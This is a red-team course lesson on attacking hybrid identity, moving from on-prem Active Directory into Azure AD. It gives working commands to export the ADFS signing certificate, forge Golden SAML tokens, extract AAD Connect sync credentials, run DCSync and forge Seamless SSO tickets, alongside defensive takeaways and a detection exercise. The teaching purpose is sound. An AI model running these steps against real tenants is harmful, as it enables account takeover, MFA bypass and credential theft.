---
title: "Cross-Environment Attack Paths — On-Premises to Cloud via Hybrid Identity"
tags: [red-team, cloud, hybrid-identity, ADFS, AAD-Connect, on-prem-to-cloud,
  Golden-SAML, Seamless-SSO, PTA, federation, ATT&CK, T1556.006, T1550.001, T1484.002]
module: 08-RedTeam-03
day: 529
related_topics:
  - Container Escape Lab (Day 528)
  - Practice Checkpoint (Day 530)
  - Domain Dominance (Day 499)
  - Azure Red Teaming (Day 525)
  - SID History and Trust Attacks (Day 516)
---

# Day 529 — Cross-Environment Attack Paths

> "The most valuable pivot in a modern enterprise is from on-premises AD to
> Azure AD. Because of hybrid identity — ADFS, AAD Connect, Seamless SSO —
> owning the on-prem AD often means owning the cloud tenant. And the reverse
> is also increasingly true. The organisation spent years securing one perimeter;
> the hybrid bridge between them is where neither team has full visibility.
> That is where the attacker lives."
>
> — Ghost

---

## Goals

Understand hybrid identity architectures: ADFS, AAD Connect, Pass-Through
Authentication, Seamless SSO.
Execute the Golden SAML attack: forge SAML tokens to authenticate to cloud
services as any user.
Understand the AAD Connect account and why it is the most dangerous account
in a hybrid environment.
Map on-premises AD compromise paths to their cloud escalation equivalents.

**Prerequisites:** Day 499 (domain dominance), Day 525–526 (Azure red teaming),
SAML and OAuth 2.0 concepts.
**Time budget:** 5 hours.

---

## Part 1 — Hybrid Identity Architecture

```
Three hybrid identity models (each has distinct attack paths):

Model 1: ADFS (Active Directory Federation Services)
  → On-prem Windows Server acting as a SAML/WS-Fed Identity Provider
  → Azure AD trusts the ADFS server as a federated identity provider
  → Authentication flow:
      User → Azure AD login page → federated to ADFS → ADFS validates credentials
      against on-prem AD → ADFS issues a SAML token → Azure AD accepts it
  → Attack: forge SAML tokens (Golden SAML)

Model 2: AAD Connect with Password Hash Sync (PHS)
  → On-prem AD password hashes are synced to Azure AD
  → Authentication happens directly at Azure AD (no ADFS needed)
  → The AZUREADSSOACC$ computer account is used for Seamless SSO (see below)
  → Attack: steal the AAD Connect service account credentials which have
    AD replication rights (DCSync equivalent) and sync account access in Azure

Model 3: AAD Connect with Pass-Through Authentication (PTA)
  → Authentication requests from Azure AD are forwarded to on-prem AD
  → A lightweight AAD Connect PTA agent on-prem validates credentials
  → Attack: compromise the PTA agent → intercept all cloud login validations;
    OR inject a malicious PTA agent that accepts any password for any user

Key insight:
  In all three models, on-prem AD compromise → cloud compromise.
  The direction is asymmetric: strong on-prem to cloud path;
  weaker cloud to on-prem path (requires specific cloud permissions).
```

---

## Part 2 — Golden SAML (ADFS)

### What Golden SAML Is

```
SAML (Security Assertion Markup Language): XML-based SSO protocol.
  → ADFS signs SAML tokens with its own token-signing certificate (private key).
  → Azure AD (and other SPs) trusts assertions signed by this certificate.

Golden SAML:
  → If you have the ADFS token-signing certificate private key:
    → You can forge SAML tokens for ANY user in the tenant
    → No username or password needed
    → No MFA to bypass (SAML assertion carries the auth context)
    → Tokens are valid for the assertion lifetime (usually 1–8 hours)
    → Like a Golden Ticket for cloud services

Required:
  → Domain Admin on the ADFS server (or DA on the domain)
  → Export the ADFS token-signing certificate (or read from ADFS config DB)
```

### Step 1: Extract the ADFS Token-Signing Certificate

```powershell
# From a Domain Admin session on the ADFS server (or via DA DCSync):
# Method 1: via ADFS PowerShell
Import-Module ADFS
Get-AdfsCertificate -CertificateType Token-Signing
# → Thumbprint, Subject, NotAfter, IsPrimary

# Export the private key from the ADFS DKM (Distributed Key Manager in AD):
# The ADFS service uses a key stored in AD under:
# CN=ADFS,CN=Microsoft,CN=Program Data,DC=corp,DC=local
# (readable with DA access; encrypted with the machine key of the ADFS server)

# Method 2: AADInternals — export directly from ADFS configuration DB
Install-Module AADInternals -Force
Export-AADIntADFSSigningCertificate -Filename adfs_signing.pfx
# → adfs_signing.pfx: the token-signing certificate with private key
```

### Step 2: Forge a Golden SAML Assertion

```python
# Tool: ADFSpoof (by fireeye/mandiant)
# pip install ADFSpoof

from ADFSpoof.core import AdfsSpoof

# Load the signing certificate:
spoofer = AdfsSpoof(
    signing_cert='adfs_signing.pfx',
    signing_cert_pass=''
)

# Forge a SAML token for the Global Administrator:
# Replace values with those from your target tenant/ADFS setup
saml_token = spoofer.forgeToken(
    server='sts.corp.local',               # ADFS server FQDN
    user='Administrator',                  # target user
    immutableid='vGcBqVMR5E2EgYS...',      # user's ImmutableID (from Azure AD)
    upn='Administrator@corp.onmicrosoft.com',
    mfa=True,                              # include MFA claim in the SAML response
    target='https://login.microsoftonline.com/...'
)

# The forged SAML token can be used to authenticate to:
#   → Azure portal (Microsoft Online Services)
#   → Microsoft 365 (Exchange, SharePoint, Teams)
#   → Any app trusting the ADFS federated domain
```

### Step 3: Use the Token with AADInternals

```powershell
# AADInternals Golden SAML (simpler interface):
# Get the ImmutableID of the target user:
$immutableId = Get-AADIntUser -UserPrincipalName "administrator@corp.onmicrosoft.com" |
    Select-Object -ExpandProperty ImmutableId

# Open a backdoor using the ADFS signing certificate:
Open-AADIntOffice365Shell -SAMLToken (New-AADIntSAMLToken `
    -ImmutableID $immutableId `
    -Issuer "https://sts.corp.local/adfs/services/trust" `
    -PfxFileName "adfs_signing.pfx" `
    -UPN "administrator@corp.onmicrosoft.com")

# → Browser opens, signed in as Administrator to Microsoft 365
# → No password, no MFA interaction
```

---

## Part 3 — AAD Connect: The Hybrid Pivot Account

```
AAD Connect runs on an on-prem Windows Server and synchronises identities
between on-prem AD and Azure AD.

The sync account (MSOL_xxxxxxxxxxxxxxxx):
  → Created automatically in on-prem AD by AAD Connect setup
  → Has: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
    (the exact rights needed for DCSync — see Day 499)
  → Password is stored locally in encrypted form and in Azure AD
  → If you have local admin on the AAD Connect server: you own the sync account

The Azure AD sync service account:
  → A Service Principal in Azure AD with Synchronization rights
  → Can reset passwords for non-admin users
  → Can modify user attributes in Azure AD (including sIDHistory-like fields)

Why this matters:
  → Compromising the AAD Connect server gives:
    1. DCSync capability on-prem (via MSOL account)
    2. Azure AD password reset capability (via Azure sync SP)
    3. Persistent hybrid foothold: as long as sync runs, credentials are maintained
```

### Extracting AAD Connect Credentials

```powershell
# On the AAD Connect server (local admin required):
# Tool: AADConnectDump (part of AADInternals)

# Get the on-prem AD sync account credentials:
Get-AADIntSyncCredentials
# → Username: MSOL_xxxxxxxxxxxxxxxx
# → Password: (plaintext — decrypted from the local AAD Connect configuration)

# Use for DCSync:
mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt \
    /user:MSOL_xxxxxxxxxxxxxxxx" exit
# → Full AD hash dump with just the MSOL account (no DA needed)

# Get the Azure AD service credentials:
Get-AADIntSyncCredentials
# → Returns: tenant ID, client ID, and credentials for the Azure sync SP
# → Use to authenticate to Azure as the sync service principal
# → Can then reset passwords for any synced user in Azure AD

# Reset a target user's Azure AD password via the sync SP:
$token = Get-AADIntAccessTokenForAADGraph -Credentials $syncCreds
Set-AADIntUserPassword -AccessToken $token `
    -SourceAnchor $immutableId -Password "NewPassword123!"
# → Password changed in Azure AD (not in on-prem AD — diverges sync)
# → The user cannot log into on-prem AD; they CAN log into Azure AD with new PW
```

---

## Part 4 — Seamless SSO: AZUREADSSOACC$ Account

```
Seamless SSO allows domain-joined Windows computers to authenticate to Azure AD
without re-entering credentials.

Mechanism:
  → AZUREADSSOACC$ is a hidden computer account created in on-prem AD by AAD Connect
  → Its password/NTLM hash is synced to Azure AD and used to validate Kerberos tickets
  → When a domain-joined PC accesses Azure AD, it gets a Kerberos ticket for
    AZUREADSSOACC$ and presents it to Azure AD
  → Azure AD validates the ticket against the known hash and issues an access token

Attack:
  → If you have DA on-prem: DCSync to get AZUREADSSOACC$ NTLM hash
  → Forge a Kerberos Silver Ticket for AZUREADSSOACC$ (see Day 499)
  → Present the forged ticket to Azure AD
  → Azure AD accepts it → access token for any on-prem synced user → MFA bypassed

  Steps (Silver Ticket for Seamless SSO):
  1. DCSync AZUREADSSOACC$ hash
  2. Forge Silver Ticket targeting AZUREADSSOACC$ (SPN = HTTP/autologon.microsoftonline.com)
  3. Use the ticket to get an Azure AD access token

  Tool: AADInternals:
  $userSid = Get-AADIntLocalDomainUserSid -UPN "targetuser@corp.local"
  $token = Get-AADIntAccessTokenWithSeamlessSSOKerberosTicket \
      -NTHash $azureadSSOCCHash \
      -SID $userSid \
      -UPN "targetuser@corp.local"
  # → Access token for targetuser in Azure AD, from on-prem DA access alone
```

---

## Part 5 — Cloud to On-Premises Attack Paths

```
Reverse paths (cloud → on-prem) are less common but exist:

Path 1: Azure AD Connect server (cloud → on-prem via the sync server)
  → If you have Global Admin in Azure AD:
    → You can configure AAD Connect's sync rules
    → Modify sync to write arbitrary attributes back to on-prem AD
    → Use write-back features to create or modify on-prem objects
    → Limited but can affect on-prem group memberships, passwords

Path 2: Hybrid Azure AD Join (cloud → on-prem device management)
  → Intune/Azure AD can push policies, scripts, and software to
    on-prem devices if they are hybrid-joined
  → Global Admin → Intune → deploy a "remediation script" that runs as SYSTEM
    on all joined devices → on-prem code execution

Path 3: Self-Service Password Reset (SSPR) writeback
  → If SSPR writeback is enabled: Azure AD password reset writes to on-prem AD
  → An attacker with the Azure sync SP credentials can reset on-prem passwords
    for synced accounts via Azure AD — bypassing on-prem password policies

Path 4: Application Proxy
  → Azure AD Application Proxy exposes on-prem web apps to the internet via
    an Azure AD authentication front-end
  → Compromising a cloud user with access to proxied apps → direct on-prem
    web application access from the internet without VPN
```

---

## Key Takeaways

1. Golden SAML is the cloud equivalent of a Golden Ticket. The ADFS token-signing
   certificate is the krbtgt of the federated cloud identity plane. An attacker who
   extracts it can authenticate as any user to any cloud service in the federation
   without needing that user's password or MFA. Rotate it after any on-prem compromise.
2. The AAD Connect server is the most critical machine in a hybrid environment.
   It holds credentials for both the on-prem DCSync account (MSOL$) and the Azure
   AD sync Service Principal. Compromising it means owning both environments
   simultaneously. Apply the strictest PAM (Privileged Access Workstation) controls
   to this server.
3. Seamless SSO (AZUREADSSOACC$) creates an on-prem key that can be used to
   authenticate to Azure AD. DCSync of this account's hash + Silver Ticket
   construction bypasses MFA for any synced user. Disable Seamless SSO if
   not operationally required; it trades UX convenience for a high-value attack
   vector.
4. Detection of cross-environment attacks requires correlation across two log
   sources: on-prem AD audit logs AND Azure AD sign-in/audit logs. Most SIEM
   deployments ingest one or the other — not both, and not correlated by user
   identity. Purple team exercises that cross this boundary expose the detection
   gap consistently.
5. The reverse path (cloud → on-prem) is underestimated. Intune policy deployment,
   SSPR writeback, and Application Proxy create attack surfaces that most on-prem
   security teams do not monitor. A cloud compromise in an organisation with hybrid
   identity should trigger on-prem IR procedures, not just cloud investigation.

---

## Exercises

1. Set up an ADFS lab (or use a lab that already has it). Export the ADFS
   token-signing certificate using AADInternals `Export-AADIntADFSSigningCertificate`.
   Forge a SAML token for a lab user and verify authentication to a SAML-protected
   application. Identify which Azure AD audit log event records the SAML
   authentication (hint: look at Sign-In Logs → Authentication method).
2. In a lab with AAD Connect: locate the MSOL account in Active Directory
   (check `CN=Microsoft Azure AD,DC=corp,DC=local` for accounts starting with
   `MSOL_`). Run `Get-AADIntSyncCredentials` to extract the password. Verify the
   credentials work by running `net use \\DC01\C$` with those credentials.
3. Write a detection rule (Sigma or KQL) that fires when a SAML authentication
   succeeds to Azure AD from an IP address that is NOT the corporate ADFS server's
   public IP. This detects Golden SAML used from an attacker's machine.
4. Research: what changed in Microsoft Entra ID (Azure AD) to detect and block
   Golden SAML attacks after the SolarWinds SUNBURST incident (2020)? What
   logging was added? What was the detection gap that allowed SUNBURST to operate
   for months using Golden SAML? (ATT&CK reference: T1556.006, T1484.002)

---

## Questions

> Add your questions here. Each question gets a Global ID (Q529.1, Q529.2 …).

---

## Navigation

← Previous: [Day 528 — Container Escape Lab](DAY-0528-Container-Escape-Lab.md)
→ Next: [Day 530 — Practice Checkpoint: Cloud and Container](DAY-0530-Practice-Checkpoint-Cloud-Container.md)
